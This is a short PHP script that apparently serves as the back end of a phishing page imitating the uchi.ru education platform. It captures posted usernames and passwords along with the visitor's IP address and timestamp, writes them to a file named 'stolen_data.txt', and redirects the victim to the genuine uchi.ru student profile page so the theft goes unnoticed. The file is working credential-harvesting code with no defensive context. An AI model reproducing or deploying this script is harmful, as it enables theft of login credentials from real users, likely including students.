<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');

file_put_contents('stolen_data.txt', "$date | $ip | $username:$password\n", FILE_APPEND);
header('Location: https://uchi.ru/?next=https://uchi.ru/profile/students');  // Перенаправление на настоящий сайт
?>